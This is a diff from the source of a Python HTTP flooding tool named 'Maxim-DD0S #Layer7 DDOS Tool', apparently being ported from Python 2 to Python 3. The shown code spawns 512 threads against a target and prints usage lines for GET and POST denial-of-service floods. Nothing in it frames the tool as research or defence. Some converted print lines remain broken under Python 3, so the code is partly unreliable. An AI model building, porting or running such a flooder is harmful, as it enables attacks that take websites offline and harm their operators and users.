@@ -95,12 +95,12 @@ class MyThread(Thread,):
                 s.close()
                 #s.recv(50000)
             except:
-                print "Target Down?"
+                print ("Target Down?")
 
 def da_delegator(SITE,DOS_TYPE):
     thread_count = 512
     print ('=') * 60
-    print 'Maxim-DD0S #Layer7 Tool v.1'.center(60,'-')
+    print ('Maxim-DD0S #Layer7 Tool v.1'.center(60,'-'))
     print ('=') * 60
     threads = []
     for num in range(thread_count):
@@ -125,10 +125,10 @@ None and t.isAlive()]
 def main(argv):
     def usage():
         print ('=') * 60
-        print 'Maxim-DD0S #Layer7 DDOS Tool v.1'.center(60,'-')
+        print ('Maxim-DD0S #Layer7 DDOS Tool v.1'.center(60,'-'))
         print ('=') * 60
-        print 'For GET DOS - USAGE: Layer7.py -t get http://example.com'
-        print 'For POST DOS - USAGE: Layer7.py -t post http://example.com'
+        print ('For GET DOS - USAGE: Layer7.py -t get http://example.com')
+        print ('For POST DOS - USAGE: Layer7.py -t post http://example.com')
         sys.exit(2)
     if not argv:
         usage()
